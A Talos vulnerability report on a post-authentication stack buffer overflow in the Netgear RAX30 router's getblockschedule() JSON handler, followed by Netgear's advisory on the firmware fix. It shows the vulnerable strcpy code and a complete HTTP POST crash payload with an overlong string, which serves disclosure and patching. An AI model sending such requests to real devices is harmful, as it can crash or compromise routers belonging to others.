# Talos Vulnerability Report

### TALOS-2023-1887

## Netgear RAX30 JSON Parsing getblockschedule() stack-based buffer overflow vulnerability

##### March 7, 2024

##### CVE Number

CVE-2023-48725

##### SUMMARY

A stack-based buffer overflow vulnerability exists in the JSON Parsing getblockschedule() functionality of Netgear RAX30 1.0.11.96 and 1.0.7.78. A specially crafted HTTP request can lead to code execution. An attacker can make an authenticated HTTP request to trigger this vulnerability.

##### CONFIRMED VULNERABLE VERSIONS

The versions below were either tested or verified to be vulnerable by Talos or confirmed to be vulnerable by the vendor.

Netgear RAX30 1.0.11.96

Netgear RAX30 1.0.7.78

##### PRODUCT URLS

RAX30 - <https://www.netgear.com/support/product/rax30>

##### CVSSv3 SCORE

7.2 - CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H

##### CWE

CWE-121 - Stack-based Buffer Overflow

##### DETAILS

AX2400 WiFi Router (RAX30) is a home router created by Netgear.

There exists a vulnerability in the `getblockschedule` function. This is called from a function lookup table inside of the `main` function of the binary.

```
int32_t getblockschedule(struct json_object* json_obj)
{
    ...
    char s_3[0x100];
    if (json_object_object_get_ex(json_obj, "message", &message_output) == 0)
    {
        cmsUtl_strcpy(&s_3, json_object_get_string(json_obj)); // unbounded strcpy to static size buffer.
    }
...
}

```

This was triggered on a live device with the following payload:

```
POST /cgi-bin/rex_cgi?csrftoken=2053576656 HTTP/1.1
Host: 192.168.1.1
Content-Length: 999
Authorization: Basic YWRtaW46R00kY3ByMjdhYQ==
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36
Content-Type: application/json; charset=UTF-8
Origin: http://192.168.1.1
Referer: http://192.168.1.1/DEV_name.html
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: session=Xa7mGpxoQNBlU9YObP5Yhga9HGgtDQIY
Connection: close

{"function":"getblockschedule","data":{"notamesg":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"}}

```

This request creates a crash of the client application due to a strcpy on an unchecked length into a stack-based buffer. This will occur whenever there is no `message` object inside of the data payload of the `getblockschedule`. This is entirely user controlled data.

# Security Advisory for Post-Authentication Stack Overflow on the RAX30, PSV-2023-0160

Was this article helpful?

 Yes

 No

Associated CVE ID: CVE-2023-48725

First published: 2024-03-06

NETGEAR is aware of a post-authentication stack overflow security vulnerability on some routers. This vulnerability requires an attacker to have your WiFi password or an Ethernet connection to a device on your network to be exploited.

NETGEAR strongly recommends that you download the latest firmware as soon as possible. Firmware fixes are currently available for all affected products:

**Routers**

* RAX28 fixed in firmware version 1.0.13.102\_HOTFIX
* RAX29 fixed in firmware version 1.0.13.102\_HOTFIX
* RAX30 fixed in firmware version 1.0.13.102\_HOTFIX

**To download the latest firmware for your NETGEAR product:**

1. Visit [NETGEAR Support](https://www.netgear.com/support/).
2. Start typing your model number in the search box, then select your model from the drop-down menu as soon as it appears.

   If you do not see a drop-down menu, make sure that you entered your model number correctly, or select a product category to browse for your product model.
3. Click **Downloads**.
4. Under **Current Versions**, select the first download whose title begins with **Firmware Version**.
5. Click **Release Notes**.
6. Follow the instructions in the firmware release notes to download and install the new firmware.

### Security Hotfixes

Security hotfixes are fixes that are applied on top of existing, fully tested firmware. Releasing hotfixes allows NETGEAR to quickly update existing products and streamline the firmware verification process without going through full regression testing. These hotfixes are targeted at specific security issues and should have minimal effect on other areas of the product’s code. Therefore, we do not expect that installing the hotfix will affect the regular operation of your product. Although our pre-deployment testing process did not indicate that these hotfixes would affect device operability, because full regression testing is reserved for final production firmware fixes, we always encourage our users to monitor their devices closely after installing a firmware hotfix.

### Disclaimer

This document is provided on an "as is" basis and does not imply any kind of guarantee or warranty, including the warranties of merchantability or fitness for a particular use. Your use of the information in the document or materials linked from the document is at your own risk. NETGEAR reserves the right to change or update this document at any time. NETGEAR expects to update this document as new information becomes available.

The post-authentication stack overflow vulnerability remains if you do not complete all recommended steps. NETGEAR is not responsible for any consequences that could have been avoided by following the recommendations in this notification.

### Common Vulnerability Scoring System

CVSS Rating: High

CVSS Score: 7.2

CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H

### Best Practices for Updating Firmware

We recommend that you keep your NETGEAR devices up to date with the latest firmware. Firmware updates contain security fixes, bug fixes, and new features for your NETGEAR products.

If your product is supported by one of our apps, using the app is the easiest way to update your firmware:

* Orbi products: NETGEAR Orbi app
* NETGEAR WiFi routers: NETGEAR Nighthawk app
* Some NETGEAR Business products: NETGEAR Insight app (firmware updates through the app are available only for Insight subscribers)

If your product is not supported by one of our apps, you can always update your firmware manually by following the instructions in your product's user manual, firmware release notes, or product support page. For more information, see [Where can I find information about my NETGEAR product?](https://kb.netgear.com/000060613/).

### Contact

We appreciate and value having security concerns brought to our attention. NETGEAR constantly monitors for both known and unknown threats. Being pro-active rather than re-active to emerging security issues is fundamental for product support at NETGEAR.

It is NETGEAR's mission to be the innovative leader in connecting the world to the internet. To achieve this mission, we strive to earn and maintain the trust of those that use NETGEAR products for their connectivity.
